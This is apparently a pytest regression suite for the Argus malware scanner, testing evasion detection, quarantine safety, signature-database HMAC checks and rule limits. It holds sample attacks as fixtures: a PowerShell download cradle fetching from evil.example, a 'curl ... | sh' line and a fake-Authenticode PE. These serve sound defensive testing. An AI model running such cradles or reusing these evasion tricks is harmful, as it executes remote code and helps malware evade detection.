"""Regression tests for the v1.0.4 fix pass.

Three audits (security / regression / evasion) produced the
findings; every fix that changed behavior is pinned here:

- A. Trust split: shared vs trusted paths, pending-DB move +
  migration, sigdb HMAC, the service action-request channel,
  approval safety, config exclusion merge.
- B. Regressions: bootstrap honesty, atomic saves, restore mode.
- C. Evasion: UTF-16 cradle, content routing, oversize floor,
  fake Authenticode, dwell deadline, ADS no-op off Windows,
  string flooding, entropy windows, ordinal imports, structure
  checks, unparseable floor, NotScanned.
- D. Perf caps: rule count / pattern / wildcard / time budget,
  import work cap.
"""

from __future__ import annotations

import hashlib
import json
import os
import sqlite3
import stat
import sys
import time
from pathlib import Path

import pytest

from pe_fixtures import (
    DATA_RW_CHARS,
    MEM_EXECUTE,
    PEBuilder,
    RDATA_CHARS,
    TEXT_CHARS,
    code_bytes,
    packed_bytes,
)

from argus import action_requests
from argus.actions import ActionEngine, ActionError, DetectionInfo
from argus.config import ArgusConfig
from argus.detections import Verdict
from argus.heuristics import analyze as analyze_mod
from argus.heuristics.analyze import analyze_file, extract_strings
from argus.paths import (
    data_dir,
    default_history_db,
    default_pending_db,
    default_status_file,
    default_vault_dir,
    requests_dir,
    results_dir,
    shared_dir,
    vault_view_path,
)
from argus.quarantine import Vault, read_pending_db
from argus.rules import (
    BUILTIN_RULES,
    MAX_RULES,
    Rule,
    RuleMatcher,
    evaluate_rules,
    load_rules,
)
from argus.scanner import iter_data_streams, scan_path
import argus.scanner as scanner_mod
from argus.signatures import (
    SignatureDB,
    SignatureError,
    bootstrap_signature_db,
    init_db,
)
from argus.watcher import DirectoryWatcher

CRADLE = (
    "powershell -nop -w hidden -c \"IEX (New-Object "
    "Net.WebClient).DownloadString('http://evil.example/payload.ps1')\""
)


@pytest.fixture()
def data_env(tmp_path, monkeypatch):
    """Point the whole Argus data layout at a temp folder."""
    root = tmp_path / "data"
    monkeypatch.setenv("ARGUS_DATA_DIR", str(root))
    return root


@pytest.fixture()
def empty_db(tmp_path):
    db_path = tmp_path / "empty.sigdb"
    init_db(db_path, seed=False)
    with SignatureDB.open(db_path) as db:
        yield db


def _signal_names(report) -> set[str]:
    return {s.name for s in report.signals}


def _scan_one(target: Path, db, rules=(), heuristics=True):
    report = scan_path(target, db, list(rules), heuristics=heuristics)
    assert len(report.files) == 1
    return report.files[0]


# ======================================================================
# C. Evasion — UTF-16 cradle (P0)
# ======================================================================
def test_utf16le_powershell_cradle_scores_malicious(tmp_path, empty_db):
    target = tmp_path / "update.ps1"
    target.write_bytes(CRADLE.encode("utf-16-le"))
    scanned = _scan_one(target, empty_db, rules=BUILTIN_RULES)
    assert scanned.verdict is Verdict.MALICIOUS
    assert "powershell_download_cradle" in _signal_names(analyze_file(target))


def test_utf16_cradle_signal_from_decoded_text(tmp_path):
    target = tmp_path / "cradle.ps1"
    target.write_bytes(
        "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a')".encode("utf-16-le")
    )
    report = analyze_file(target)
    assert report.kind == "script"
    assert "powershell_download_cradle" in _signal_names(report)


def test_plain_powershell_mention_stays_clean(tmp_path, empty_db):
    """Calibration guard: merely mentioning powershell in a text
    file is not a cradle and must not be flagged Malicious."""
    target = tmp_path / "notes.txt"
    target.write_text("remember to ask IT about powershell updates")
    scanned = _scan_one(target, empty_db)
    assert scanned.verdict is Verdict.CLEAN


# ======================================================================
# C. Evasion — content routing
# ======================================================================
def test_pe_content_in_text_file_is_routed_to_pe(tmp_path):
    pe = (
        PEBuilder()
        .add_section(".text", code_bytes(512), TEXT_CHARS)
        .build()
    )
    target = tmp_path / "notes.txt"
    target.write_bytes(pe)
    report = analyze_file(target)
    assert report.kind == "pe"
    assert "content_extension_mismatch" in _signal_names(report)


def test_script_content_in_exe_name_is_routed_to_script(tmp_path):
    target = tmp_path / "tool.exe"
    target.write_text("#!/bin/sh\ncurl http://example.invalid/x | sh\n")
    report = analyze_file(target)
    assert report.kind == "script"
    assert "script_extension_mismatch" in _signal_names(report)


# ======================================================================
# C. Evasion — fake Authenticode
# ======================================================================
def _cert_offset(pe: bytes, cert_size: int) -> int:
    return len(pe) - cert_size


def test_fake_certificate_counts_as_overlay_not_signature(tmp_path):
    # The builder writes a structurally VALID cert header; corrupt
    # its dwLength so the entry claims far more bytes than the
    # certificate region holds — the classic fake-"signed" padding.
    # It must earn no signed credit, and the region is overlay.
    cert_size = 0x1000
    pe = bytearray(
        PEBuilder()
        .add_section(".text", code_bytes(512), TEXT_CHARS)
        .set_cert(cert_size)
        .build()
    )
    off = _cert_offset(bytes(pe), cert_size)
    pe[off : off + 4] = (0x2000).to_bytes(4, "little")  # dwLength lies
    target = tmp_path / "signed.exe"
    target.write_bytes(bytes(pe))
    report = analyze_file(target)
    assert report.signed is False
    assert "malformed_certificate" in _signal_names(report)


def test_structurally_valid_certificate_is_signed(tmp_path):
    cert_size = 0x1000
    pe = bytearray(
        PEBuilder()
        .add_section(".text", code_bytes(512), TEXT_CHARS)
        .set_cert(cert_size)
        .build()
    )
    off = _cert_offset(bytes(pe), cert_size)
    pe[off : off + 4] = cert_size.to_bytes(4, "little")  # dwLength
    pe[off + 6 : off + 8] = (0x0002).to_bytes(2, "little")  # wCertificateType
    target = tmp_path / "really-signed.exe"
    target.write_bytes(bytes(pe))
    report = analyze_file(target)
    assert report.signed is True
    assert "malformed_certificate" not in _signal_names(report)


# ======================================================================
# C. Evasion — oversize executables
# ======================================================================
def test_oversize_pe_rules_still_run_and_floor_applies(
    tmp_path, empty_db, monkeypatch
):
    marker = b"EVILPAYLOADMARKER"
    pe = (
        PEBuilder()
        .add_section(".text", code_bytes(256) + marker, TEXT_CHARS)
        .build()
    )
    target = tmp_path / "padded.exe"
    target.write_bytes(pe + b"\x00" * 200_000)
    # Shrink both caps so the 200 KB file is "oversize" for the test.
    monkeypatch.setattr(scanner_mod, "MAX_RULE_SCAN_SIZE", 100_000)
    monkeypatch.setattr(analyze_mod, "MAX_HEURISTIC_SCAN_SIZE", 100_000)

    # Floor: no rules at all — an oversize executable whose deep
    # analysis was skipped for size is never Clean on structure.
    scanned = _scan_one(target, empty_db, rules=[])
    assert "oversize_not_fully_analyzed" in {
        s.name for s in scanned.assessment.signals
    }
    assert scanned.assessment.score >= 25
    assert scanned.verdict is not Verdict.CLEAN

    # Rules run at any size for PE content: the marker rule hits
    # even though the file is over the rule-scan cap.
    rule = Rule.from_dict(
        {
            "name": "Marker_Rule",
            "description": "test",
            "severity": "high",
            "condition": "any",
            "patterns": [{"text": "EVILPAYLOADMARKER"}],
        }
    )
    scanned = _scan_one(target, empty_db, rules=[rule])
    assert scanned.rules_skipped_reason is None
    assert any(d.name == "Marker_Rule" for d in scanned.assessment.detections)


def test_oversize_bulk_data_still_skips_rules(tmp_path, empty_db, monkeypatch):
    target = tmp_path / "bulk.bin"
    target.write_bytes(b"EVILPAYLOADMARKER" + b"\x00" * 200_000)
    monkeypatch.setattr(scanner_mod, "MAX_RULE_SCAN_SIZE", 100_000)
    rule = Rule.from_dict(
        {
            "name": "Marker_Rule",
            "description": "test",
            "severity": "high",
            "condition": "any",
            "patterns": [{"text": "EVILPAYLOADMARKER"}],
        }
    )
    scanned = _scan_one(target, empty_db, rules=[rule])
    assert scanned.rules_skipped_reason is not None
    assert scanned.assessment.detections == []


# ======================================================================
# C. Evasion — watcher dwell deadline
# ======================================================================
def test_watcher_dwell_deadline_forces_scan(tmp_path):
    watched = tmp_path / "watched"
    watched.mkdir()
    target = watched / "growing.bin"
    target.write_bytes(b"x")
    ready: list[Path] = []
    watcher = DirectoryWatcher(
        [watched],
        poll_interval=0.05,
        stable_polls=10_000,  # stability can never trigger
        on_ready=ready.append,
        max_dwell_seconds=1.0,
    )
    deadline = time.time() + 6.0
    forced = False
    while time.time() < deadline and not forced:
        # Keep the file changing so only the dwell deadline can
        # ever report it.
        with open(target, "ab") as fh:
            fh.write(b"y")
        watcher.poll_once()
        if target in ready:
            forced = watcher.consume_forced(target)
        time.sleep(0.2)
    assert forced, "dwell deadline never force-reported the file"
    assert target in ready


# ======================================================================
# C. Evasion — ADS (Windows) is a clean no-op elsewhere
# ======================================================================
@pytest.mark.skipif(sys.platform == "win32", reason="ADS enumeration is Windows-only")
def test_ads_enumeration_noop_on_linux(tmp_path):
    target = tmp_path / "plain.txt"
    target.write_text("ordinary")
    assert iter_data_streams(target) == []


# ======================================================================
# C. Evasion — string flooding, entropy windows, structure
# ======================================================================
def test_string_flooding_needles_survive_extraction_cap(tmp_path):
    # 21,000 filler strings overflow the 20,000-string extraction
    # cap; the high-value needle placed AFTER them must still be
    # found by the independent streaming needle search, and the
    # truncation itself is a scored signal.
    filler = b"\x00".join(
        f"filler_string_number_{i}".encode() for i in range(21_000)
    )
    pe = (
        PEBuilder()
        .add_section(".text", code_bytes(256), TEXT_CHARS)
        .add_section(".rdata", filler + b"\x00amsiscanbuffer\x00", RDATA_CHARS)
        .build()
    )
    target = tmp_path / "flooded.exe"
    target.write_bytes(pe)
    index = extract_strings(target)
    assert index.truncated is True
    report = analyze_file(target)
    names = _signal_names(report)
    assert "string_extraction_truncated" in names
    assert "amsi_bypass_strings" in names


def test_high_entropy_overlay_outside_sections(tmp_path):
    pe = (
        PEBuilder()
        .add_section(".text", code_bytes(512), TEXT_CHARS)
        .set_overlay(packed_bytes(8192))
        .build()
    )
    target = tmp_path / "overlay.exe"
    target.write_bytes(pe)
    report = analyze_file(target)
    assert "high_entropy_outside_sections" in _signal_names(report)


def test_zero_raw_check_is_name_independent(tmp_path):
    # An executable section NOT named like code, with virtual size
    # but no raw data — the zero-raw check applies by layout, not
    # by section name.
    pe = (
        PEBuilder()
        .add_section(".text", code_bytes(256), TEXT_CHARS)
        .add_section(
            ".data", b"", DATA_RW_CHARS | MEM_EXECUTE, virtual_size=0x1000
        )
        .build()
    )
    target = tmp_path / "hollow.exe"
    target.write_bytes(pe)
    report = analyze_file(target)
    assert "zero_raw_code_section" in _signal_names(report)


def test_unparseable_pe_with_entropy_reaches_suspicious(tmp_path, empty_db):
    target = tmp_path / "broken.exe"
    target.write_bytes(b"MZ" + b"\x00" * 62 + packed_bytes(8192))
    report = analyze_file(target)
    assert "unparseable_executable" in _signal_names(report)
    scanned = _scan_one(target, empty_db)
    assert scanned.verdict in (Verdict.SUSPICIOUS, Verdict.MALICIOUS)


# ======================================================================
# C/D. Ordinal imports + import work cap
# ======================================================================
def test_ordinal_heavy_imports_signal(tmp_path):
    pe = (
        PEBuilder()
        .add_section(".text", code_bytes(256), TEXT_CHARS)
        .set_imports(
            {"KERNEL32.dll": [f"#{n}" for n in range(1, 13)] + ["CreateFileA"]}
        )
        .build()
    )
    target = tmp_path / "ordinals.exe"
    target.write_bytes(pe)
    report = analyze_file(target)
    assert "ordinal_heavy_imports" in _signal_names(report)


def test_import_work_cap_raises_truncation_signal(tmp_path, monkeypatch):
    import argus.heuristics.pe as pe_mod

    monkeypatch.setattr(pe_mod, "MAX_IMPORT_WORK", 64)
    pe = (
        PEBuilder()
        .add_section(".text", code_bytes(256), TEXT_CHARS)
        .set_imports(
            {"KERNEL32.dll": [f"Function{i:03d}" for i in range(100)]}
        )
        .build()
    )
    target = tmp_path / "manyimports.exe"
    target.write_bytes(pe)
    report = analyze_file(target)
    assert "imports_truncated" in _signal_names(report)


# ======================================================================
# C. Locked files — explicit NotScanned
# ======================================================================
@pytest.mark.skipif(
    sys.platform == "win32" or os.geteuid() == 0,
    reason="permission-based unreadability needs a non-root POSIX user",
)
def test_unreadable_file_verdict_is_not_scanned(tmp_path, empty_db):
    target = tmp_path / "locked.exe"
    target.write_bytes(b"MZ secret")
    target.chmod(0)
    try:
        scanned = _scan_one(target, empty_db)
    finally:
        target.chmod(0o644)
    assert scanned.verdict is Verdict.NOT_SCANNED
    assert scanned.assessment.flagged is False


# ======================================================================
# A. Trust split — paths
# ======================================================================
def test_trust_split_paths(data_env):
    root = data_env
    assert shared_dir() == root / "shared"
    assert default_history_db() == root / "shared" / "history.db"
    # v1.1.0 (P0-1): the pending DB is service-owned in the TRUSTED
    # root; the shared location is now only the legacy path, and
    # user-side readers use the service-published pending view.
    assert default_pending_db() == root / "quarantine" / "pending.db"
    from argus.paths import legacy_shared_pending_db, pending_view_path

    assert legacy_shared_pending_db() == root / "shared" / "pending.db"
    assert pending_view_path() == root / "shared" / "pending-view.json"
    assert default_status_file() == root / "shared" / "argus-status.json"
    assert vault_view_path() == root / "shared" / "vault-view.json"
    assert requests_dir() == root / "shared" / "requests"
    assert results_dir() == root / "shared" / "results"
    # The vault stays in the TRUSTED root, not the shared subtree.
    assert default_vault_dir() == root / "quarantine"
    assert shared_dir() not in default_vault_dir().parents
    # A default config agrees: status file in shared; pending_db
    # unset means "the shared default" everywhere it is resolved.
    config = ArgusConfig()
    assert Path(config.status_file) == default_status_file()
    assert config.pending_db is None


# ======================================================================
# A. Trust split — pending DB move + migration + loose reads
# ======================================================================
def test_pending_actions_live_in_their_own_db(tmp_path):
    vault_dir = tmp_path / "quarantine"
    pending_db = tmp_path / "shared" / "pending.db"
    vault = Vault.open(vault_dir, pending_db)
    try:
        pending = vault.add_pending(
            source="realtime", path="/tmp/evil.exe", action="quarantine",
            sha256="a" * 64, severity="high", verdict="Malicious",
            detection_name="Test", reasons=["bad"],
        )
        assert vault.get_pending(pending.id) is not None
    finally:
        vault.close()
    assert pending_db.is_file()
    # vault.db itself holds NO pending table anymore.
    conn = sqlite3.connect(vault_dir / "vault.db")
    try:
        tables = {
            row[0]
            for row in conn.execute(
                "SELECT name FROM sqlite_master WHERE type='table'"
            )
        }
    finally:
        conn.close()
    assert "pending_actions" not in tables
    # And the loose reader (GUI/CLI without vault access) sees it.
    rows = read_pending_db(pending_db)
    assert [r.id for r in rows] == [pending.id]
    assert rows[0].sha256 == "a" * 64


def test_pending_migration_from_legacy_vault_db(tmp_path):
    vault_dir = tmp_path / "quarantine"
    vault_dir.mkdir()
    # A v1.0.3-era vault.db carrying its queue inside.
    conn = sqlite3.connect(vault_dir / "vault.db")
    conn.execute(
        """
        CREATE TABLE pending_actions (
            id TEXT PRIMARY KEY, created_at TEXT NOT NULL,
            decided_at TEXT, source TEXT NOT NULL, path TEXT NOT NULL,
            sha256 TEXT, action TEXT NOT NULL, severity TEXT,
            verdict TEXT, detection_name TEXT,
            reasons TEXT NOT NULL DEFAULT '[]',
            status TEXT NOT NULL DEFAULT 'pending',
            entry_id TEXT, error TEXT
        )
        """
    )
    conn.execute(
        "INSERT INTO pending_actions VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (
            "legacy-1", "2026-10-18T00:00:00+00:00", None, "realtime",
            "/tmp/old.exe", "b" * 64, "quarantine", "high", "Malicious",
            "Old.Threat", '["legacy"]', "pending", None, None,
        ),
    )
    conn.commit()
    conn.close()

    pending_db = tmp_path / "shared" / "pending.db"
    vault = Vault.open(vault_dir, pending_db)
    try:
        migrated = vault.get_pending("legacy-1")
        assert migrated is not None
        assert migrated.path == "/tmp/old.exe"
        assert migrated.status == "pending"
    finally:
        vault.close()
    conn = sqlite3.connect(vault_dir / "vault.db")
    try:
        tables = {
            row[0]
            for row in conn.execute(
                "SELECT name FROM sqlite_master WHERE type='table'"
            )
        }
    finally:
        conn.close()
    assert "pending_actions" not in tables  # moved out, not copied


def test_read_pending_db_missing_file_is_empty(tmp_path):
    assert read_pending_db(tmp_path / "nope.db") == []


# ======================================================================
# A. Signature DB authenticity (HMAC)
# ======================================================================
def test_sigdb_hmac_created_and_verified(tmp_path):
    db_path = tmp_path / "sigs.sigdb"
    init_db(db_path)
    key_path = Path(str(db_path) + ".key")
    assert key_path.is_file()
    if sys.platform != "win32":
        assert stat.S_IMODE(key_path.stat().st_mode) == 0o600
    with SignatureDB.open(db_path, require_auth=True) as db:
        assert db.info.auth_missing is False


def test_sigdb_hmac_tamper_rejected(tmp_path):
    db_path = tmp_path / "sigs.sigdb"
    init_db(db_path)
    # Tamper: rewrite a stored hash without knowing the key — the
    # stored HMAC no longer matches the canonical hash list.
    conn = sqlite3.connect(db_path)
    conn.execute("UPDATE hashes SET sha256 = ? WHERE rowid = 1", ("0" * 64,))
    conn.commit()
    conn.close()
    with pytest.raises(SignatureError):
        SignatureDB.open(db_path, require_auth=True)
    with pytest.raises(SignatureError):
        SignatureDB.open(db_path)  # a present-but-wrong tag is fatal


def test_sigdb_missing_key_warns_but_opens(tmp_path):
    db_path = tmp_path / "sigs.sigdb"
    init_db(db_path)
    Path(str(db_path) + ".key").unlink()
    with SignatureDB.open(db_path) as db:
        assert db.info.auth_missing is True  # loud, not bricked


# ======================================================================
# B. Bootstrap honesty
# ======================================================================
def test_bootstrap_only_autocreates_at_default_path(data_env, tmp_path):
    # Default path: created + seeded on first use.
    default_path = data_dir() / "signatures.sigdb"
    bootstrap_signature_db(default_path)
    assert default_path.is_file()
    # A NON-default configured path that is missing is an error,
    # never a silent creation.
    custom = tmp_path / "custom.sigdb"
    with pytest.raises(SignatureError):
        bootstrap_signature_db(custom)
    assert not custom.exists()


def test_bootstrap_reinits_empty_file(tmp_path):
    db_path = tmp_path / "signatures.sigdb"
    db_path.write_bytes(b"")  # e.g. a crashed first run
    bootstrap_signature_db(db_path)
    with SignatureDB.open(db_path) as db:
        assert db.info.count >= 1  # seeded


# ======================================================================
# A. Pending approval safety + direct delete verification
# ======================================================================
def _engine(tmp_path):
    vault = Vault.open(tmp_path / "quarantine", tmp_path / "pending.db")
    return vault, ActionEngine(vault, ArgusConfig())


def test_approve_refuses_null_hash(tmp_path):
    vault, engine = _engine(tmp_path)
    try:
        target = tmp_path / "mystery.exe"
        target.write_bytes(b"MZ unknown")
        pending = vault.add_pending(
            source="realtime", path=str(target), action="quarantine",
            sha256=None, severity="high", verdict="Malicious",
            detection_name="Test", reasons=["no fingerprint recorded"],
        )
        with pytest.raises(ActionError):
            engine.approve(pending.id)
        assert target.exists()  # untouched
        # The refusal is recorded on the queue row, never silent.
        decided = vault.get_pending(pending.id)
        assert decided.status == "failed"
        assert "no recorded fingerprint" in (decided.error or "")
    finally:
        vault.close()


def test_approve_refuses_when_file_changed(tmp_path):
    vault, engine = _engine(tmp_path)
    try:
        target = tmp_path / "evil.exe"
        target.write_bytes(b"MZ original")
        digest = hashlib.sha256(b"MZ original").hexdigest()
        pending = engine.enqueue(
            source="realtime", path=target, action="quarantine",
            info=DetectionInfo(
                name="Test.Threat", severity="high", verdict="Malicious",
                reasons=["test"], sha256=digest,
            ),
        )
        target.write_bytes(b"MZ swapped-in-later")
        with pytest.raises(ActionError):
            engine.approve(pending.id)
        assert target.read_bytes() == b"MZ swapped-in-later"
        decided = vault.get_pending(pending.id)
        assert decided.status == "failed"
        assert "changed since it was queued" in (decided.error or "")
    finally:
        vault.close()


def test_delete_direct_verifies_hash(tmp_path):
    # v1.1.0 (P2): direct=True was removed — delete always routes
    # through the vault, whose fingerprint check still refuses a
    # swapped file.
    vault, engine = _engine(tmp_path)
    try:
        target = tmp_path / "evil.exe"
        target.write_bytes(b"MZ original")
        digest = hashlib.sha256(b"MZ original").hexdigest()
        info = DetectionInfo(
            name="Test.Threat", severity="high", verdict="Malicious",
            reasons=["test"], sha256=digest,
        )
        with pytest.raises(TypeError):
            engine.delete(target, info, confirmed=True, direct=True)
        target.write_bytes(b"MZ different file entirely")
        from argus.quarantine import QuarantineError

        with pytest.raises(QuarantineError):
            engine.delete(target, info, confirmed=True)
        assert target.exists()
        # The matching file deletes fine (via the vault).
        target.write_bytes(b"MZ original")
        outcome = engine.delete(target, info, confirmed=True)
        assert outcome.done
        assert not target.exists()
        assert vault.list_entries()[0].status == "deleted"
    finally:
        vault.close()


# ======================================================================
# B. Restore mode round-trip + exclusion merge + atomic saves
# ======================================================================
@pytest.mark.skipif(sys.platform == "win32", reason="POSIX mode bits")
def test_quarantine_restore_preserves_mode(tmp_path):
    vault = Vault.open(tmp_path / "quarantine", tmp_path / "pending.db")
    try:
        target = tmp_path / "tool.sh"
        target.write_bytes(b"#!/bin/sh\necho hi\n")
        target.chmod(0o751)
        entry = vault.quarantine_file(
            target, detection_name="Test", severity="low"
        )
        restored = vault.restore(entry.id)
        assert stat.S_IMODE(Path(restored).stat().st_mode) == 0o751
    finally:
        vault.close()


def test_exclusion_merge_survives_stale_save(tmp_path):
    config_path = tmp_path / "argus-config.json"
    config = ArgusConfig()
    config.save(config_path)
    # Another process vouches for a hash on disk meanwhile.
    other = ArgusConfig.load(config_path)
    other.exclusions.hashes = frozenset({"c" * 64})
    other.save(config_path)
    # Our stale in-memory copy saves an unrelated change the way
    # every production caller does (absorb, then save): the
    # disk-side vouch must survive (lost-update fix).
    config.absorb_disk_exclusions(config_path)
    config.watch_dirs = [tmp_path / "watched"]
    config.save(config_path)
    reloaded = ArgusConfig.load(config_path)
    assert "c" * 64 in reloaded.exclusions.hashes
    assert reloaded.watch_dirs == [tmp_path / "watched"]


@pytest.mark.skipif(sys.platform == "win32", reason="POSIX mode bits")
def test_config_save_atomic_preserves_mode_and_leaves_no_tmp(tmp_path):
    config_path = tmp_path / "argus-config.json"
    config = ArgusConfig()
    config.save(config_path)
    config_path.chmod(0o640)
    config.watch_dirs = [tmp_path / "x"]
    config.save(config_path)
    assert stat.S_IMODE(config_path.stat().st_mode) == 0o640
    assert list(tmp_path.glob("*.tmp")) == []
    assert ArgusConfig.load(config_path).watch_dirs == [tmp_path / "x"]


# ======================================================================
# D. Rules engine caps + time budget
# ======================================================================
def _rule_spec(name: str, pattern: dict) -> dict:
    return {
        "name": name,
        "description": "test",
        "severity": "high",
        "condition": "any",
        "patterns": [pattern],
    }


def test_rules_count_cap(tmp_path):
    specs = [_rule_spec(f"R{i}", {"text": f"marker-{i}"}) for i in range(MAX_RULES + 10)]
    path = tmp_path / "rules.json"
    path.write_text(json.dumps(specs))
    rules = load_rules(path)
    assert len(rules) == MAX_RULES


def test_rule_pattern_too_long_rejected_others_load(tmp_path):
    specs = [
        _rule_spec("TooLong", {"hex": " ".join(["41"] * 5000)}),
        _rule_spec("Good", {"text": "fine-marker"}),
    ]
    path = tmp_path / "rules.json"
    path.write_text(json.dumps(specs))
    rules = load_rules(path)
    assert [r.name for r in rules] == ["Good"]


def test_rule_wildcard_density_rejected(tmp_path):
    specs = [
        _rule_spec("MostlyWild", {"hex": "41 " + " ".join(["??"] * 10)}),
        _rule_spec("Good", {"text": "fine-marker"}),
    ]
    path = tmp_path / "rules.json"
    path.write_text(json.dumps(specs))
    rules = load_rules(path)
    assert [r.name for r in rules] == ["Good"]


class _FakeClock:
    """Deterministic stand-in for ``time.monotonic``: time stands
    still until the test advances it, so budget behavior never
    depends on the host clock's resolution."""

    def __init__(self, start: float = 1000.0) -> None:
        self.now = start

    def __call__(self) -> float:
        return self.now

    def advance(self, seconds: float) -> None:
        self.now += seconds


def test_rule_match_time_budget_notes_and_stops():
    rules = [
        Rule.from_dict(_rule_spec(f"R{i}", {"text": f"needle-{i}"}))
        for i in range(50)
    ]
    # The budget is polled as matching proceeds: the first feed
    # starts the clock, and once elapsed time passes the budget,
    # matching stops and the partial coverage is flagged. Driven
    # by a fake clock via the matcher's clock seam: the original
    # version used a 0.0 budget with the real clock and passed
    # only if time.monotonic() ticked between two adjacent calls
    # — true on Linux's nanosecond-resolution clock, but on
    # Windows the two calls can land on the same tick, elapsed
    # reads exactly 0.0, and the budget never "expires" (that is
    # the v1.0.4 Windows CI failure this rewrite removes).
    clock = _FakeClock()
    matcher = RuleMatcher(rules, time_budget=2.0)
    matcher._clock = clock
    matcher.feed(b"some content ")
    assert matcher.budget_exceeded is False
    clock.advance(3.0)  # past the 2s budget
    matcher.feed(b"needle-1 and more")
    assert matcher.budget_exceeded is True
    # A generous budget matches normally.
    matcher = RuleMatcher(rules, time_budget=60.0)
    matcher.feed(b"some content needle-1 and more")
    assert matcher.budget_exceeded is False
    assert any(h.name == "R1" for h in matcher.finish())


# ======================================================================
# A. Service action-request channel — full round trip
# ======================================================================
def test_request_channel_round_trip(data_env, tmp_path):
    from argus.service import ArgusService

    watched = tmp_path / "watched"
    watched.mkdir()
    db_path = tmp_path / "sigs.sigdb"
    init_db(db_path)
    config = ArgusConfig(
        watch_dirs=[watched],
        poll_interval=0.05,
        stable_polls=1,
        process_monitor_enabled=False,
        signature_db=str(db_path),
        status_file=str(data_env / "shared" / "argus-status.json"),
        heartbeat_interval=0.5,
    )
    service = ArgusService(config=config)
    service.start()
    try:
        # Quarantine a file through the service's own engine (its
        # vault is the trusted one under the data root).
        target = tmp_path / "evil.exe"
        target.write_bytes(b"MZ pretend malware")
        outcome = service.actions.quarantine(
            target,
            DetectionInfo(
                name="Test.Threat", severity="high",
                verdict="Malicious", reasons=["round trip"],
                sha256=hashlib.sha256(b"MZ pretend malware").hexdigest(),
            ),
            confirmed=True,
        )
        assert outcome.done and outcome.entry_id
        assert not target.exists()
        entry = service.vault.get_entry(outcome.entry_id)

        # The GUI/CLI side: no direct vault access — file a request
        # and wait for the service (its polling thread) to execute
        # it against its own records.
        result = action_requests.submit_and_wait(
            "restore",
            entry_id=entry.id,
            sha256=entry.sha256,
            requested_by="test",
            timeout=20.0,
        )
        assert result.ok, result.message
        assert result.restored_path is not None
        assert Path(result.restored_path).read_bytes() == b"MZ pretend malware"
        assert service.vault.get_entry(entry.id).status == "restored"

        # A request naming a fingerprint the human did NOT see is
        # refused by the service, loudly.
        outcome2 = service.actions.quarantine(
            Path(result.restored_path),
            DetectionInfo(
                name="Test.Threat", severity="high",
                verdict="Malicious", reasons=["round trip 2"],
                sha256=hashlib.sha256(b"MZ pretend malware").hexdigest(),
            ),
            confirmed=True,
        )
        entry2 = service.vault.get_entry(outcome2.entry_id)
        result2 = action_requests.submit_and_wait(
            "delete",
            entry_id=entry2.id,
            sha256="0" * 64,  # not the fingerprint on record
            requested_by="test",
            timeout=20.0,
        )
        assert result2.ok is False
        assert service.vault.get_entry(entry2.id).status == "quarantined"
    finally:
        service.stop()


def test_vault_view_published_for_unprivileged_readers(data_env, tmp_path):
    from argus.service import ArgusService

    watched = tmp_path / "watched"
    watched.mkdir()
    db_path = tmp_path / "sigs.sigdb"
    init_db(db_path)
    config = ArgusConfig(
        watch_dirs=[watched],
        poll_interval=0.05,
        stable_polls=1,
        process_monitor_enabled=False,
        signature_db=str(db_path),
        status_file=str(data_env / "shared" / "argus-status.json"),
        heartbeat_interval=0.5,
    )
    service = ArgusService(config=config)
    service.start()
    try:
        assert vault_view_path().is_file()  # published at start
        target = tmp_path / "evil.exe"
        target.write_bytes(b"MZ pretend malware")
        outcome = service.actions.quarantine(
            target,
            DetectionInfo(
                name="Test.Threat", severity="high",
                verdict="Malicious", reasons=["view test"],
                sha256=hashlib.sha256(b"MZ pretend malware").hexdigest(),
            ),
            confirmed=True,
        )
        service.write_status()  # heartbeat path republishes on change
        view = json.loads(vault_view_path().read_text(encoding="utf-8"))
        ids = [e["id"] for e in view["entries"]]
        assert outcome.entry_id in ids
    finally:
        service.stop()


# ======================================================================
# A. Heartbeat trust + SYSTEM watch dirs (platform-graceful paths)
# ======================================================================
def test_winservice_query_state_graceful_off_windows():
    if sys.platform == "win32":
        pytest.skip("off-Windows behavior only")
    from argus.winservice import query_service_state

    assert query_service_state() in (False, "not-installed")


def test_system_watch_dirs_noop_off_windows(tmp_path):
    from argus.service import ArgusService

    config = ArgusConfig(watch_dirs=[tmp_path / "watched"])
    service = ArgusService(config=config)
    before = list(service.config.watch_dirs)
    service._apply_system_watch_dirs()
    assert list(service.config.watch_dirs) == before
